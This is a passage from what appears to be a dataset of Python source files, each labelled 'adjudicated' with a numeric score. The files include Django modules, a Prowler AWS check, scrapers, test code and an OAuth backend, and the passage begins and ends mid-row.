loaded<<NEWL>>    rows = driver.find_elements(By.CSS_SELECTOR, ""div.rt-tr-group"")<<NEWL>>    if len(rows) == len(champions):<<NEWL>>        break<<NEWL>>    <<NEWL>>    # Otherwise, continue to extract the data<<NEWL>>    for i in range(len(champions), len(rows)):<<NEWL>>        row = rows[i]<<NEWL>>        champion = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(3)"").get_attribute(""textContent"")<<NEWL>>        win_rate = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(5)"").text.strip()<<NEWL>>        pick_rate = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(6)"").text.strip()<<NEWL>>            <<NEWL>>        champions.append(champion)<<NEWL>>        win_rates.append(win_rate)<<NEWL>>        pick_rates.append(pick_rate)<<NEWL>><<NEWL>>        writer.writerow([champion, win_rate, pick_rate])<<NEWL>><<NEWL>>print(champions)<<NEWL>>print(win_rates)<<NEWL>>print(pick_rates)<<NEWL>><<NEWL>>driver.quit()"
358	adjudicated	1	"# Copyright 2017-present Adtran, Inc.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>from voltha.adapters.adtran_onu.pon_port import PonPort<<NEWL>>from mock import MagicMock<<NEWL>>import pytest<<NEWL>><<NEWL>>## Test class PonPort init settings  ###############<<NEWL>>def test_PonPort_inits():<<NEWL>>    handler = MagicMock()<<NEWL>>    handler.device_id = 100<<NEWL>>    portnum = 1<<NEWL>>    testponport = PonPort(handler, portnum)<<NEWL>><<NEWL>>    assert testponport._enabled is False<<NEWL>>    assert testponport._valid is True<<NEWL>>    assert testponport._handler is handler<<NEWL>>    assert testponport._deferred is None<<NEWL>>    assert testponport._port is None<<NEWL>>    assert testponport._port_number == 1<<NEWL>>    assert testponport._entity_id is None<<NEWL>>    assert testponport._next_entity_id == PonPort.MIN_GEM_ENTITY_ID<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>## Test PonPort staticmethod #########<<NEWL>>def test_create():<<NEWL>>    handler = MagicMock()<<NEWL>>    handler.device_id = 200<<NEWL>>    port_no = 2<<NEWL>>    testcreate = PonPort.create(handler, port_no)<<NEWL>><<NEWL>>    assert isinstance(testcreate, PonPort)<<NEWL>>    assert testcreate._handler is handler<<NEWL>>    assert testcreate._port_number is port_no<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>## Test PonPort @property #########<<NEWL>>def test_PonPort_properties():<<NEWL>>    handler = MagicMock()<<NEWL>>    handler.device_id = 300<<NEWL>>    port_no = 3<<NEWL>>    testprop1 = PonPort(handler, port_no)<<NEWL>><<NEWL>>    assert testprop1.enabled is False<<NEWL>>    assert testprop1.port_number == 3<<NEWL>>    assert testprop1.entity_id is None<<NEWL>>    assert testprop1.next_gem_entity_id == PonPort.MIN_GEM_ENTITY_ID<<NEWL>>    assert testprop1.tconts == {}<<NEWL>>    assert testprop1.gem_ports == {}<<NEWL>><<NEWL>>"
249	adjudicated	1	"from prowler.lib.check.models import Check, Check_Report_AWS<<NEWL>>from prowler.providers.aws.services.directoryservice.directoryservice_client import (<<NEWL>>    directoryservice_client,<<NEWL>>)<<NEWL>><<NEWL>>SNAPSHOT_LIMIT_THRESHOLD = 2<<NEWL>>""""""Number of remaining snapshots to reach the limit""""""<<NEWL>><<NEWL>><<NEWL>>class directoryservice_directory_snapshots_limit(Check):<<NEWL>>    def execute(self):<<NEWL>>        findings = []<<NEWL>>        for directory in directoryservice_client.directories.values():<<NEWL>>            report = Check_Report_AWS(self.metadata())<<NEWL>>            report.region = directory.region<<NEWL>>            report.resource_id = directory.id<<NEWL>>            if directory.snapshots_limits:<<NEWL>>                if directory.snapshots_limits.manual_snapshots_limit_reached:<<NEWL>>                    report.status = ""FAIL""<<NEWL>>                    report.status_extended = f""Directory Service {directory.id} reached {directory.snapshots_limits.manual_snapshots_limit} Snapshots limit""<<NEWL>>                else:<<NEWL>>                    limit_remaining = (<<NEWL>>                        directory.snapshots_limits.manual_snapshots_limit<<NEWL>>                        - directory.snapshots_limits.manual_snapshots_current_count<<NEWL>>                    )<<NEWL>>                    if limit_remaining <= SNAPSHOT_LIMIT_THRESHOLD:<<NEWL>>                        report.status = ""FAIL""<<NEWL>>                        report.status_extended = f""Directory Service {directory.id} is about to reach {directory.snapshots_limits.manual_snapshots_limit} Snapshots which is the limit""<<NEWL>>                    else:<<NEWL>>                        report.status = ""PASS""<<NEWL>>                        report.status_extended = f""Directory Service {directory.id} is using {directory.snapshots_limits.manual_snapshots_current_count} out of {directory.snapshots_limits.manual_snapshots_limit} from the Snapshots Limit""<<NEWL>>                findings.append(report)<<NEWL>><<NEWL>>        return findings"
309	adjudicated	3	"from datetime import datetime<<NEWL>>from .virtualtimescheduler import VirtualTimeScheduler<<NEWL>><<NEWL>><<NEWL>>class HistoricalScheduler(VirtualTimeScheduler):<<NEWL>>    """"""Provides a virtual time scheduler that uses datetime for absolute time<<NEWL>>    and timedelta for relative time.""""""<<NEWL>><<NEWL>>    def __init__(self, initial_clock=None, comparer=None):<<NEWL>>        """"""Creates a new historical scheduler with the specified initial clock<<NEWL>>        value.<<NEWL>><<NEWL>>        Keyword arguments:<<NEWL>>        initial_clock -- {Number} Initial value for the clock.<<NEWL>>        comparer -- {Function} Comparer to determine causality of events based<<NEWL>>            on absolute time.""""""<<NEWL>><<NEWL>>        def compare_datetimes(a, b):<<NEWL>>            return (a > b) - (a < b)<<NEWL>><<NEWL>>        clock = initial_clock or datetime.fromtimestamp(0)<<NEWL>>        comparer = comparer or compare_datetimes<<NEWL>><<NEWL>>        super(HistoricalScheduler, self).__init__(clock)<<NEWL>><<NEWL>>    @property<<NEWL>>    def now(self):<<NEWL>>        """"""Represents a notion of time for this scheduler. Tasks being scheduled<<NEWL>>        on a scheduler will adhere to the time denoted by this property.""""""<<NEWL>><<NEWL>>        return self.clock<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def add(absolute, relative):<<NEWL>>        """"""Adds a relative time value to an absolute time value.<<NEWL>><<NEWL>>        Keyword arguments:<<NEWL>>        absolute -- {datetime} Absolute virtual time value.<<NEWL>>        relative -- {timedelta} Relative virtual time value to add.<<NEWL>><<NEWL>>        Returns resulting absolute virtual time sum value.""""""<<NEWL>><<NEWL>>        return absolute + relative<<NEWL>><<NEWL>>    def to_datetime_offset(self, absolute):<<NEWL>>        """"""Converts the absolute time value to a datetime value.""""""<<NEWL>><<NEWL>>        # datetime -> datetime<<NEWL>>        return absolute<<NEWL>><<NEWL>>    def to_relative(self, timespan):<<NEWL>>        """"""Converts the timespan value to a relative virtual time value.<<NEWL>><<NEWL>>        Keyword arguments:<<NEWL>>        timespan -- {timedelta} Time_span value to convert.<<NEWL>><<NEWL>>        Returns corresponding relative virtual time value.""""""<<NEWL>><<NEWL>>        # timedelta -> timedelta<<NEWL>>        return timespan"
98	adjudicated	1	"# -*- coding: utf-8 -*-<<NEWL>><<NEWL>>""""""<<NEWL>>requests.compat<<NEWL>>~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>This module handles import compatibility issues between Python 2 and<<NEWL>>Python 3.<<NEWL>>""""""<<NEWL>><<NEWL>>import chardet<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>># -------<<NEWL>># Pythons<<NEWL>># -------<<NEWL>><<NEWL>># Syntax sugar.<<NEWL>>_ver = sys.version_info<<NEWL>><<NEWL>>#: Python 2.x?<<NEWL>>is_py2 = (_ver[0] == 2)<<NEWL>><<NEWL>>#: Python 3.x?<<NEWL>>is_py3 = (_ver[0] == 3)<<NEWL>><<NEWL>>try:<<NEWL>>    import simplejson as json<<NEWL>>except ImportError:<<NEWL>>    import json<<NEWL>><<NEWL>># ---------<<NEWL>># Specifics<<NEWL>># ---------<<NEWL>><<NEWL>>if is_py2:<<NEWL>>    from urllib import (<<NEWL>>        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,<<NEWL>>        proxy_bypass, proxy_bypass_environment, getproxies_environment)<<NEWL>>    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag<<NEWL>>    from urllib2 import parse_http_list<<NEWL>>    import cookielib<<NEWL>>    from Cookie import Morsel<<NEWL>>    from StringIO import StringIO<<NEWL>>    # Keep OrderedDict for backwards compatibility.<<NEWL>>    from collections import Callable, Mapping, MutableMapping, OrderedDict<<NEWL>><<NEWL>><<NEWL>>    builtin_str = str<<NEWL>>    bytes = str<<NEWL>>    str = unicode<<NEWL>>    basestring = basestring<<NEWL>>    numeric_types = (int, long, float)<<NEWL>>    integer_types = (int, long)<<NEWL>><<NEWL>>elif is_py3:<<NEWL>>    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag<<NEWL>>    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment<<NEWL>>    from http import cookiejar as cookielib<<NEWL>>    from http.cookies import Morsel<<NEWL>>    from io import StringIO<<NEWL>>    # Keep OrderedDict for backwards compatibility.<<NEWL>>    from collections import OrderedDict<<NEWL>>    from collections.abc import Callable, Mapping, MutableMapping<<NEWL>><<NEWL>>    builtin_str = str<<NEWL>>    str = str<<NEWL>>    bytes = bytes<<NEWL>>    basestring = (str, bytes)<<NEWL>>    numeric_types = (int, float)<<NEWL>>    integer_types = (int,)"
88	adjudicated	3	"from MySQLdb.constants import FIELD_TYPE<<NEWL>><<NEWL>>from django.contrib.gis.gdal import OGRGeomType<<NEWL>>from django.db.backends.mysql.introspection import DatabaseIntrospection<<NEWL>><<NEWL>><<NEWL>>class MySQLIntrospection(DatabaseIntrospection):<<NEWL>>    # Updating the data_types_reverse dictionary with the appropriate<<NEWL>>    # type for Geometry fields.<<NEWL>>    data_types_reverse = DatabaseIntrospection.data_types_reverse.copy()<<NEWL>>    data_types_reverse[FIELD_TYPE.GEOMETRY] = ""GeometryField""<<NEWL>><<NEWL>>    def get_geometry_type(self, table_name, description):<<NEWL>>        with self.connection.cursor() as cursor:<<NEWL>>            # In order to get the specific geometry type of the field,<<NEWL>>            # we introspect on the table definition using `DESCRIBE`.<<NEWL>>            cursor.execute(""DESCRIBE %s"" % self.connection.ops.quote_name(table_name))<<NEWL>>            # Increment over description info until we get to the geometry<<NEWL>>            # column.<<NEWL>>            for column, typ, null, key, default, extra in cursor.fetchall():<<NEWL>>                if column == description.name:<<NEWL>>                    # Using OGRGeomType to convert from OGC name to Django field.<<NEWL>>                    # MySQL does not support 3D or SRIDs, so the field params<<NEWL>>                    # are empty.<<NEWL>>                    field_type = OGRGeomType(typ).django<<NEWL>>                    field_params = {}<<NEWL>>                    break<<NEWL>>        return field_type, field_params<<NEWL>><<NEWL>>    def supports_spatial_index(self, cursor, table_name):<<NEWL>>        # Supported with MyISAM/Aria, or InnoDB on MySQL 5.7.5+/MariaDB.<<NEWL>>        storage_engine = self.get_storage_engine(cursor, table_name)<<NEWL>>        if storage_engine == ""InnoDB"":<<NEWL>>            if self.connection.mysql_is_mariadb:<<NEWL>>                return True<<NEWL>>            return self.connection.mysql_version >= (5, 7, 5)<<NEWL>>        return storage_engine in (""MyISAM"", ""Aria"")"
319	adjudicated	1	"from django.contrib.sites.models import Site<<NEWL>>from django.db import models<<NEWL>>from django.urls import NoReverseMatch, get_script_prefix, reverse<<NEWL>>from django.utils.encoding import iri_to_uri<<NEWL>>from django.utils.translation import gettext_lazy as _<<NEWL>><<NEWL>><<NEWL>>class FlatPage(models.Model):<<NEWL>>    url = models.CharField(_(""URL""), max_length=100, db_index=True)<<NEWL>>    title = models.CharField(_(""title""), max_length=200)<<NEWL>>    content = models.TextField(_(""content""), blank=True)<<NEWL>>    enable_comments = models.BooleanField(_(""enable comments""), default=False)<<NEWL>>    template_name = models.CharField(<<NEWL>>        _(""template name""),<<NEWL>>        max_length=70,<<NEWL>>        blank=True,<<NEWL>>        help_text=_(<<NEWL>>            ""Example: “flatpages/contact_page.html”. If this isn’t provided, ""<<NEWL>>            ""the system will use “flatpages/default.html”.""<<NEWL>>        ),<<NEWL>>    )<<NEWL>>    registration_required = models.BooleanField(<<NEWL>>        _(""registration required""),<<NEWL>>        help_text=_(<<NEWL>>            ""If this is checked, only logged-in users will be able to view the page.""<<NEWL>>        ),<<NEWL>>        default=False,<<NEWL>>    )<<NEWL>>    sites = models.ManyToManyField(Site, verbose_name=_(""sites""))<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        db_table = ""django_flatpage""<<NEWL>>        verbose_name = _(""flat page"")<<NEWL>>        verbose_name_plural = _(""flat pages"")<<NEWL>>        ordering = [""url""]<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return ""%s -- %s"" % (self.url, self.title)<<NEWL>><<NEWL>>    def get_absolute_url(self):<<NEWL>>        from .views import flatpage<<NEWL>><<NEWL>>        for url in (self.url.lstrip(""/""), self.url):<<NEWL>>            try:<<NEWL>>                return reverse(flatpage, kwargs={""url"": url})<<NEWL>>            except NoReverseMatch:<<NEWL>>                pass<<NEWL>>        # Handle script prefix manually because we bypass reverse()<<NEWL>>        return iri_to_uri(get_script_prefix().rstrip(""/"") + self.url)"
259	adjudicated	4	"""""""tst_tc1357_uxusylnz_68580 URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/2.2/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import path, include, re_path<<NEWL>>from django.views.generic.base import TemplateView<<NEWL>>from allauth.account.views import confirm_email<<NEWL>>from rest_framework import permissions<<NEWL>>from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    <<NEWL>>    path(""accounts/"", include(""allauth.urls"")),<<NEWL>>    path(""modules/"", include(""modules.urls"")),<<NEWL>>    path(""api/v1/"", include(""home.api.v1.urls"")),<<NEWL>>    path(""admin/"", admin.site.urls),<<NEWL>>    path(""users/"", include(""users.urls"", namespace=""users"")),<<NEWL>>    path(""rest-auth/"", include(""rest_auth.urls"")),<<NEWL>>    # Override email confirm to use allauth's HTML view instead of rest_auth's API view<<NEWL>>    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),<<NEWL>>    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),<<NEWL>>]<<NEWL>><<NEWL>>admin.site.site_header = ""TST-TC1357-uxusylnzzz""<<NEWL>>admin.site.site_title = ""TST-TC1357-uxusylnzzz Admin Portal""<<NEWL>>admin.site.index_title = ""TST-TC1357-uxusylnzzz Admin""<<NEWL>><<NEWL>># swagger<<NEWL>>urlpatterns += [<<NEWL>>    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),<<NEWL>>    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
348	adjudicated	3	"""""""<<NEWL>>https://adventofcode.com/2016/day/15<<NEWL>>""""""<<NEWL>>from utils import extract_ints, read_data<<NEWL>><<NEWL>>USE_TEST_DATA = False<<NEWL>>SPLIT_BY_LINE = True<<NEWL>>data = read_data(USE_TEST_DATA, SPLIT_BY_LINE)<<NEWL>><<NEWL>><<NEWL>>def parse_data(data_in):<<NEWL>>    """""" Read the input data to retrieve the disc positions """"""<<NEWL>>    num_positions = []<<NEWL>>    starting_pos = []<<NEWL>><<NEWL>>    for line in data_in:<<NEWL>>        ints = extract_ints(line)<<NEWL>>        num_positions.append(ints[1])<<NEWL>>        starting_pos.append(ints[3])<<NEWL>><<NEWL>>    return num_positions, starting_pos<<NEWL>><<NEWL>><<NEWL>>def is_at_zero(num_positions, starting_pos, disc_index, time):<<NEWL>>    """""" Is the specified disc at the zero position at the given time? """"""<<NEWL>>    pos = (starting_pos[disc_index] + time) % num_positions[disc_index]<<NEWL>>    return pos == 0<<NEWL>><<NEWL>><<NEWL>>def find_time(num_positions, starting_pos):<<NEWL>>    """"""<<NEWL>>    Find the time at which to release a capsule so that it passes through all<<NEWL>>    discs successfully<<NEWL>>    """"""<<NEWL>><<NEWL>>    # What's the first time that we can release the disc where it reaches the<<NEWL>>    # first disc as it's at position 0?<<NEWL>>    candidate_time = num_positions[0] - starting_pos[0] - 1<<NEWL>><<NEWL>>    while True:<<NEWL>>        # Are all discs at position 0 when the capsule reaches them?<<NEWL>>        collision = False<<NEWL>>        for disc_index in range(len(num_positions)):<<NEWL>>            time_capsule_reaches_disc = candidate_time + disc_index + 1<<NEWL>>            if not is_at_zero(num_positions, starting_pos, disc_index, time_capsule_reaches_disc):<<NEWL>>                collision = True<<NEWL>>                break<<NEWL>><<NEWL>>        # There was no collision with any disc! candidate_time is the correct answer!<<NEWL>>        if not collision:<<NEWL>>            return candidate_time<<NEWL>><<NEWL>>        # There was a collision so candidate_time isn't a valid result.<<NEWL>>        # Increment it to the next time that disc 1 (index 0) is at the zero position.<<NEWL>>        candidate_time += num_positions[0]<<NEWL>><<NEWL>><<NEWL>>positions, starting = parse_data(data)<<NEWL>><<NEWL>># Part 1<<NEWL>># At what time can we release the capsule to pass through all of the discs?<<NEWL>>print(find_time(positions, starting))<<NEWL>><<NEWL>># Part 2<<NEWL>># What if we add another disc at the bottom?<<NEWL>>positions.append(11)<<NEWL>>starting.append(0)<<NEWL>>print(find_time(positions, starting))"
199	adjudicated	1	"# image_uri extractor<<NEWL>>import requests<<NEWL>>from bs4 import BeautifulSoup<<NEWL>>import time<<NEWL>><<NEWL>>import json<<NEWL>><<NEWL>>api_url = 'http://127.0.0.1:3000/items'<<NEWL>><<NEWL>># Get the current list of daily items from the API<<NEWL>>response = requests.get(api_url)<<NEWL>>items = response.json()<<NEWL>><<NEWL>>updated_count = 0<<NEWL>>skipped_count = 0<<NEWL>><<NEWL>>last_attempted_item = 0<<NEWL>><<NEWL>># Go through each item and update the image URI<<NEWL>>for item in items:<<NEWL>>    if item['id'] < 57722:<<NEWL>>        continue<<NEWL>>    if last_attempted_item is not None and item['id'] < last_attempted_item:<<NEWL>>        continue<<NEWL>>    if item['valid_status'] is True:<<NEWL>>        skipped_count += 1<<NEWL>>        continue<<NEWL>>    while True:<<NEWL>>        try:<<NEWL>>            search_url = f""https://rl.insider.gg/en/pc/search?q={item['name'].replace(' ', '+')}""<<NEWL>>            search_response = requests.get(search_url)<<NEWL>>            search_html = search_response.text<<NEWL>>            search_soup = BeautifulSoup(search_html, 'html.parser')<<NEWL>>            search_items = search_soup.find_all('div', class_='item')<<NEWL>>            for search_item in search_items:<<NEWL>>                if search_item.find('span', class_='itemName').text.lower() == item['name'].lower():<<NEWL>>                    img_uri = search_item['data-uri']<<NEWL>>                    if ""import/import"" in img_uri:<<NEWL>>                        img_uri = img_uri.replace(""import/import"", ""import"")<<NEWL>>                    item['image_uri'] = img_uri<<NEWL>>                    patch_response = requests.patch(api_url+'/'+str(item['id']), json={'image_uri': img_uri})<<NEWL>>                    print(f""{item['id']} Image URI updated"")<<NEWL>>                    updated_count += 1<<NEWL>>                    break<<NEWL>>            else:<<NEWL>>                print(f""{item['id']} No image URI found"")<<NEWL>>                skipped_count += 1<<NEWL>>            last_attempted_item = item['id']<<NEWL>>            break<<NEWL>>        except Exception as e:<<NEWL>>            print(f""Error updating item {item['id']}: {e}"")<<NEWL>>            print(f""Retrying in 5 minutes..."")<<NEWL>>            time.sleep(5 * 60)<<NEWL>>            continue<<NEWL>><<NEWL>>print(f""Updated {updated_count} items"")<<NEWL>>print(f""Skipped {skipped_count} items"")"
208	adjudicated	4	"""""""tst_tc751_ckuayzoqs_68554 URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/2.2/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import path, include, re_path<<NEWL>>from django.views.generic.base import TemplateView<<NEWL>>from allauth.account.views import confirm_email<<NEWL>>from rest_framework import permissions<<NEWL>>from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    <<NEWL>>    path(""accounts/"", include(""allauth.urls"")),<<NEWL>>    path(""modules/"", include(""modules.urls"")),<<NEWL>>    path(""api/v1/"", include(""home.api.v1.urls"")),<<NEWL>>    path(""admin/"", admin.site.urls),<<NEWL>>    path(""users/"", include(""users.urls"", namespace=""users"")),<<NEWL>>    path(""rest-auth/"", include(""rest_auth.urls"")),<<NEWL>>    # Override email confirm to use allauth's HTML view instead of rest_auth's API view<<NEWL>>    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),<<NEWL>>    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),<<NEWL>>]<<NEWL>><<NEWL>>admin.site.site_header = ""TST-TC751-ckuayzoqsc""<<NEWL>>admin.site.site_title = ""TST-TC751-ckuayzoqsc Admin Portal""<<NEWL>>admin.site.index_title = ""TST-TC751-ckuayzoqsc Admin""<<NEWL>><<NEWL>># swagger<<NEWL>>urlpatterns += [<<NEWL>>    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),<<NEWL>>    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
406	adjudicated	2	"""""""<<NEWL>>This module deals with interpreting the parse tree as Python<<NEWL>>would have done, in the compiler.<<NEWL>><<NEWL>>For now this only covers parse tree to value conversion of<<NEWL>>compile-time values.<<NEWL>>""""""<<NEWL>><<NEWL>>from __future__ import absolute_import<<NEWL>><<NEWL>>from .Nodes import *<<NEWL>>from .ExprNodes import *<<NEWL>>from .Errors import CompileError<<NEWL>><<NEWL>><<NEWL>>class EmptyScope(object):<<NEWL>>    def lookup(self, name):<<NEWL>>        return None<<NEWL>><<NEWL>>empty_scope = EmptyScope()<<NEWL>><<NEWL>>def interpret_compiletime_options(optlist, optdict, type_env=None, type_args=()):<<NEWL>>    """"""<<NEWL>>    Tries to interpret a list of compile time option nodes.<<NEWL>>    The result will be a tuple (optlist, optdict) but where<<NEWL>>    all expression nodes have been interpreted. The result is<<NEWL>>    in the form of tuples (value, pos).<<NEWL>><<NEWL>>    optlist is a list of nodes, while optdict is a DictNode (the<<NEWL>>    result optdict is a dict)<<NEWL>><<NEWL>>    If type_env is set, all type nodes will be analysed and the resulting<<NEWL>>    type set. Otherwise only interpretateable ExprNodes<<NEWL>>    are allowed, other nodes raises errors.<<NEWL>><<NEWL>>    A CompileError will be raised if there are problems.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def interpret(node, ix):<<NEWL>>        if ix in type_args:<<NEWL>>            if type_env:<<NEWL>>                type = node.analyse_as_type(type_env)<<NEWL>>                if not type:<<NEWL>>                    raise CompileError(node.pos, ""Invalid type."")<<NEWL>>                return (type, node.pos)<<NEWL>>            else:<<NEWL>>                raise CompileError(node.pos, ""Type not allowed here."")<<NEWL>>        else:<<NEWL>>            if (sys.version_info[0] >=3 and<<NEWL>>                isinstance(node, StringNode) and<<NEWL>>                node.unicode_value is not None):<<NEWL>>                return (node.unicode_value, node.pos)<<NEWL>>            return (node.compile_time_value(empty_scope), node.pos)<<NEWL>><<NEWL>>    if optlist:<<NEWL>>        optlist = [interpret(x, ix) for ix, x in enumerate(optlist)]<<NEWL>>    if optdict:<<NEWL>>        assert isinstance(optdict, DictNode)<<NEWL>>        new_optdict = {}<<NEWL>>        for item in optdict.key_value_pairs:<<NEWL>>            new_key, dummy = interpret(item.key, None)<<NEWL>>            new_optdict[new_key] = interpret(item.value, item.key.value)<<NEWL>>        optdict = new_optdict<<NEWL>>    return (optlist, new_optdict)"
457	adjudicated	4	"""""""<<NEWL>>String utility functions.<<NEWL>>""""""<<NEWL>><<NEWL>>from typing import Any, Optional, Union<<NEWL>><<NEWL>><<NEWL>>def safe_repr(obj: Any, clip: Optional[int] = None) -> str:<<NEWL>>    """"""<<NEWL>>    Convert object to string representation, yielding the same result a `repr`<<NEWL>>    but catches all exceptions and returns 'N/A' instead of raising the<<NEWL>>    exception. Strings may be truncated by providing `clip`.<<NEWL>><<NEWL>>    >>> safe_repr(42)<<NEWL>>    '42'<<NEWL>>    >>> safe_repr('Clipped text', clip=8)<<NEWL>>    'Clip..xt'<<NEWL>>    >>> safe_repr([1,2,3,4], clip=8)<<NEWL>>    '[1,2..4]'<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        s = repr(obj)<<NEWL>>        if not clip or len(s) <= clip:<<NEWL>>            return s<<NEWL>>        else:<<NEWL>>            return s[:clip - 4] + '..' + s[-2:]<<NEWL>>    except:<<NEWL>>        return 'N/A'<<NEWL>><<NEWL>><<NEWL>>def trunc(obj: str, max: int, left: bool = False) -> str:<<NEWL>>    """"""<<NEWL>>    Convert `obj` to string, eliminate newlines and truncate the string to<<NEWL>>    `max` characters. If there are more characters in the string add ``...`` to<<NEWL>>    the string. With `left=True`, the string can be truncated at the beginning.<<NEWL>><<NEWL>>    @note: Does not catch exceptions when converting `obj` to string with<<NEWL>>        `str`.<<NEWL>><<NEWL>>    >>> trunc('This is a long text.', 8)<<NEWL>>    This ...<<NEWL>>    >>> trunc('This is a long text.', 8, left=True)<<NEWL>>    ...text.<<NEWL>>    """"""<<NEWL>>    s = str(obj)<<NEWL>>    s = s.replace('\n', '|')<<NEWL>>    if len(s) > max:<<NEWL>>        if left:<<NEWL>>            return '...' + s[len(s) - max + 3:]<<NEWL>>        else:<<NEWL>>            return s[:(max - 3)] + '...'<<NEWL>>    else:<<NEWL>>        return s<<NEWL>><<NEWL>><<NEWL>>def pp(i: Union[int, float], base: int = 1024) -> str:<<NEWL>>    """"""<<NEWL>>    Pretty-print the integer `i` as a human-readable size representation.<<NEWL>>    """"""<<NEWL>>    degree = 0<<NEWL>>    pattern = ""%4d     %s""<<NEWL>>    while i > base:<<NEWL>>        pattern = ""%7.2f %s""<<NEWL>>        i = i / float(base)<<NEWL>>        degree += 1<<NEWL>>    scales = ['B', 'KB', 'MB', 'GB', 'TB', 'EB']<<NEWL>>    return pattern % (i, scales[degree])<<NEWL>><<NEWL>><<NEWL>>def pp_timestamp(t: Optional[float]) -> str:<<NEWL>>    """"""<<NEWL>>    Get a friendly timestamp represented as a string.<<NEWL>>    """"""<<NEWL>>    if t is None:<<NEWL>>        return ''<<NEWL>>    h, m, s = int(t / 3600), int(t / 60 % 60), t % 60<<NEWL>>    return ""%02d:%02d:%05.2f"" % (h, m, s)"
517	adjudicated	4	"""""""<<NEWL>>Kakao OAuth2 backend, docs at:<<NEWL>>    https://python-social-auth.readthedocs.io/en/latest/backends/kakao.html<<NEWL>>""""""<<NEWL>>from .oauth import BaseOAuth2<<NEWL>><<NEWL>><<NEWL>>class KakaoOAuth2(BaseOAuth2):<<NEWL>>    """"""Kakao OAuth authentication backend""""""<<NEWL>>    name = 'kakao'<<NEWL>>    AUTHORIZATION_URL = 'https://kauth.kakao.com/oauth/authorize'<<NEWL>>    ACCESS_TOKEN_URL = 'https://kauth.kakao.com/oauth/token'<<NEWL>>    ACCESS_TOKEN_METHOD = 'POST'<<NEWL>>    REDIRECT_STATE = False<<NEWL>>    EXTRA_DATA = [<<NEWL>>        ('properties', 'properties'),<<NEWL>>    ]<<NEWL>><<NEWL>>    def get_user_id(self, details, response):<<NEWL>>        return response['id']<<NEWL>><<NEWL>>    def get_user_details(self, response):<<NEWL>>        """"""Return user details from Kakao account""""""<<NEWL>><<NEWL>>        kakao_account = response.get('kakao_account', '')<<NEWL>>        kaccount_email = kakao_account.get('email', '')<<NEWL>>        properties = response.get('properties', '')<<NEWL>>        nickname = properties.get('nickname') if properties else ''<<NEWL>>        return {<<NEWL>>            'username': nickname,<<NEWL>>            'email': kaccount_email,<<NEWL>>            'fullname': nickname,<<NEWL>>            'first_name': nickname[1:] if nickname else '',<<NEWL>>            'last_name': nickname[0] if nickname else '',<<NEWL>>        }<<NEWL>><<NEWL>>    def user_data(self, access_token, *args, **kwargs):<<NEWL>>        """"""Loads user data from 